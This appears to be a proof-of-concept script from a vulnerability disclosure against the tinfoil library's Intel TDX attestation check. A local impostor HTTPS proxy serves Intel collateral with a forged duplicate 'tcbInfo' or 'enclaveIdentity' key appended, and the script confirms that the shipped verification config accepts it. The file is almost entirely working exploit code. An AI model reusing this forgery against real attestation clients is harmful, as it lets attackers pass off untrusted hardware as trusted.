"""
PoC 3: same end-to-end flow as PoC 2, but WITHOUT stubbing requests.get.

The real requests -> urllib3 -> TLS (certificate + hostname verification) -> HTTP
stack fetches collateral from https://tdx-proxy.tinfoil.sh/... . A local HTTPS
server plays tdx-proxy.tinfoil.sh. The only deviations from production:
  * process-local DNS: socket.getaddrinfo maps ONLY tdx-proxy.tinfoil.sh to
    127.0.0.1:<port>; every other non-loopback name fails closed (no traffic can
    leave the machine);
  * trust: REQUESTS_CA_BUNDLE (requests' documented env knob) points at a local CA
    that issued the server's tdx-proxy.tinfoil.sh certificate -- i.e. the attacker
    is the proxy operator or holds a WebPKI-valid certificate for that name;
  * clock frozen to 2023-06-30; policy constants matched to the 2023 sample quote
    (see PoC 2). Collateral logic untouched.

Usage: python -I poc3_real_https_stack.py <data_dir> <workdir>
"""
import base64
import copy
import dataclasses
import datetime as _dt
import gzip
import http.server
import json
import os
import socket
import ssl
import sys
import tempfile
import threading
from unittest import mock

DATA, WORK = sys.argv[1], sys.argv[2]
PROXY_HOST = "tdx-proxy.tinfoil.sh"

# ---------------------------------------------------------------- local PKI ---
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

now = _dt.datetime.now(_dt.timezone.utc)
ca_key = ec.generate_private_key(ec.SECP256R1())
ca_name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "PoC attacker-trusted CA")])
ca_cert = (x509.CertificateBuilder().subject_name(ca_name).issuer_name(ca_name)
           .public_key(ca_key.public_key()).serial_number(x509.random_serial_number())
           .not_valid_before(now - _dt.timedelta(days=1)).not_valid_after(now + _dt.timedelta(days=30))
           .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
           .add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, crl_sign=True,
                                        content_commitment=False, key_encipherment=False,
                                        data_encipherment=False, key_agreement=False,
                                        encipher_only=False, decipher_only=False), critical=True)
           .add_extension(x509.SubjectKeyIdentifier.from_public_key(ca_key.public_key()), critical=False)
           .sign(ca_key, hashes.SHA256()))
srv_key = ec.generate_private_key(ec.SECP256R1())
srv_cert = (x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, PROXY_HOST)]))
            .issuer_name(ca_name).public_key(srv_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - _dt.timedelta(days=1)).not_valid_after(now + _dt.timedelta(days=30))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(PROXY_HOST)]), critical=False)
            .add_extension(x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()), critical=False)
            .sign(ca_key, hashes.SHA256()))
os.makedirs(WORK, exist_ok=True)
ca_path, crt_path, key_path = (os.path.join(WORK, n) for n in ("ca.pem", "srv.pem", "srv.key"))
open(ca_path, "wb").write(ca_cert.public_bytes(serialization.Encoding.PEM))
open(crt_path, "wb").write(srv_cert.public_bytes(serialization.Encoding.PEM))
open(key_path, "wb").write(srv_key.private_bytes(serialization.Encoding.PEM,
                                                  serialization.PrivateFormat.PKCS8,
                                                  serialization.NoEncryption()))
os.environ["REQUESTS_CA_BUNDLE"] = ca_path
for v in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy", "ALL_PROXY", "all_proxy"):
    os.environ.pop(v, None)

# ------------------------------------------------------ fail-closed resolver ---
_orig_gai = socket.getaddrinfo
SERVER_PORT = None


def _gai(host, port, *a, **k):
    if host == PROXY_HOST:
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", SERVER_PORT))]
    if host in ("127.0.0.1", "localhost", "::1"):
        return _orig_gai(host, port, *a, **k)
    raise socket.gaierror(f"PoC resolver: refusing to resolve {host!r} (no external traffic)")


socket.getaddrinfo = _gai

# ---------------------------------------------------------------- data ---
def rd(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


QUOTE = rd("quote.dat")
GENUINE_TCB = rd("tcb_info.json").rstrip()
GENUINE_QE = rd("qe_identity.json").rstrip()
TCB_CHAIN = rd("tcbInfoIssuerChain.txt", "r").strip()
QE_CHAIN = rd("qeIdentityIssuerChain.txt", "r").strip()
PCKCRL_CHAIN = rd("pckCrlIssuerChain.txt", "r").strip()
PCK_CRL_PEM = x509.load_der_x509_crl(rd("pckcrl.der")).public_bytes(serialization.Encoding.PEM)
ROOT_CRL_DER = rd("rootcrl.der")


def append_duplicate(genuine, key, forged_obj):
    assert genuine.endswith(b"}")
    return genuine[:-1] + b',"' + key.encode() + b'":' + json.dumps(
        forged_obj, separators=(",", ":")).encode() + b"}"


# ---------------------------------------------------------- HTTPS server ---
SERVE = {"tcb": GENUINE_TCB, "qe": GENUINE_QE}
REQLOG = []


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        REQLOG.append(f"GET https://{self.headers.get('Host')}{self.path}")
        p = self.path
        if p.startswith("/api.trustedservices.intel.com/tdx/certification/v4/tcb?"):
            body, hdr = SERVE["tcb"], ("TCB-Info-Issuer-Chain", TCB_CHAIN)
        elif p.startswith("/api.trustedservices.intel.com/tdx/certification/v4/qe/identity"):
            body, hdr = SERVE["qe"], ("SGX-Enclave-Identity-Issuer-Chain", QE_CHAIN)
        elif p.startswith("/api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform"):
            body, hdr = PCK_CRL_PEM, ("SGX-PCK-CRL-Issuer-Chain", PCKCRL_CHAIN)
        elif p == "/certificates.trustedservices.intel.com/IntelSGXRootCA.der":
            body, hdr = ROOT_CRL_DER, None
        else:
            self.send_error(404)
            return
        self.send_response(200)
        if hdr:
            self.send_header(*hdr)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
sctx.load_cert_chain(crt_path, key_path)
httpd.socket = sctx.wrap_socket(httpd.socket, server_side=True)
SERVER_PORT = httpd.server_address[1]
threading.Thread(target=httpd.serve_forever, daemon=True).start()

# ----------------------------------------------------------- tinfoil ---
import requests  # noqa: E402
import tinfoil  # noqa: E402
import tinfoil.attestation.cert_utils as cu  # noqa: E402
import tinfoil.attestation.collateral_tdx as ct  # noqa: E402
import tinfoil.attestation.attestation_tdx as at  # noqa: E402
from tinfoil.attestation.attestation import Document  # noqa: E402
from tinfoil.attestation.types import PredicateType  # noqa: E402
from tinfoil.attestation.abi_tdx import parse_quote  # noqa: E402

assert ct.requests.get is requests.get and requests.get.__module__ == "requests.api", "requests.get is not stubbed"
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime


def run(label, cfg, cache_dir):
    REQLOG.clear()
    doc = Document(format=PredicateType.TDX_GUEST_V2, body=base64.b64encode(gzip.compress(QUOTE)).decode())
    with mock.patch.object(ct, "_TDX_CACHE_DIR", cache_dir), mock.patch.object(at, "_DEFAULT_CONFIG", cfg):
        try:
            v = doc.verify()
            res = at.verify_tdx_attestation(doc.body, config=cfg)
            print(f"[{label}] ACCEPTED: tls_key_fp={v.public_key_fp[:16]}... hpke={v.hpke_public_key[:16]}... "
                  f"tcb_status={res.tcb_level.tcb_status.value}")
            out = True
        except Exception as e:  # noqa: BLE001
            print(f"[{label}] REJECTED: {type(e).__name__}: {e}")
            out = False
    for line in sorted(set(REQLOG)):
        print("      server saw:", line)
    return out


def main():
    print("tinfoil:", tinfoil.__file__, "| requests:", requests.__version__,
          "| TDX_PROXY_HOST:", ct.TDX_PROXY_HOST, "| local server port:", SERVER_PORT)
    # sanity: a non-trusted CA must fail (proves TLS verification is live)
    os.environ["REQUESTS_CA_BUNDLE"] = requests.certs.where()
    try:
        requests.get(f"https://{PROXY_HOST}/certificates.trustedservices.intel.com/IntelSGXRootCA.der", timeout=5)
        print("[sanity] !! TLS verification not enforced")
        return 1
    except requests.exceptions.SSLError as e:
        print("[sanity] default trust store rejects the impostor server:", type(e).__name__)
    os.environ["REQUESTS_CA_BUNDLE"] = ca_path

    q = parse_quote(QUOTE)
    b = q.td_quote_body
    cfg = dataclasses.replace(at.TdxVerificationConfig(), accepted_mr_seams=(b.mr_seam,),
                              expected_td_attributes=b.td_attributes, expected_xfam=b.xfam,
                              expected_minimum_tee_tcb_svn=b.tee_tcb_svn)
    cfg15 = dataclasses.replace(cfg, min_tcb_evaluation_data_number=15)

    forged = copy.deepcopy(json.loads(GENUINE_TCB)["tcbInfo"])
    z = [{"svn": 0} for _ in range(16)]
    forged.update(tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z",
                  tcbLevels=[{"tcb": {"sgxtcbcomponents": z, "pcesvn": 0, "tdxtcbcomponents": z},
                              "tcbDate": "2023-02-15T00:00:00Z", "tcbStatus": "UpToDate"}],
                  tdxModuleIdentities=[{"id": "TDX_00", "mrsigner": "00" * 48, "attributes": "0000000000000000",
                                        "attributesMask": "FFFFFFFFFFFFFFFF",
                                        "tcbLevels": [{"tcb": {"isvsvn": 0}, "tcbDate": "2023-02-15T00:00:00Z",
                                                       "tcbStatus": "UpToDate"}]}])
    fq = copy.deepcopy(json.loads(GENUINE_QE)["enclaveIdentity"])
    fq.update(tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")

    r = {}
    with tempfile.TemporaryDirectory() as d:
        print("\n== B: genuine Intel collateral over real HTTPS, min eval 15")
        r["B"] = run("B", cfg15, os.path.join(d, "B"))
        SERVE["tcb"] = append_duplicate(GENUINE_TCB, "tcbInfo", forged)
        print("\n== D: same, server appends forged duplicate 'tcbInfo'")
        r["D"] = run("D", cfg15, os.path.join(d, "D"))
        SERVE["qe"] = append_duplicate(GENUINE_QE, "enclaveIdentity", fq)
        print("\n== G: SHIPPED config (min eval 19), duplicate 'tcbInfo' + duplicate 'enclaveIdentity'")
        r["G"] = run("G", cfg, os.path.join(d, "G"))
    print("\nSUMMARY:", {k: "ACCEPT" if v else "REJECT" for k, v in r.items()})
    return 0 if r == {"B": False, "D": True, "G": True} else 1


if __name__ == "__main__":
    rc = main()
    httpd.shutdown()
    sys.exit(rc)
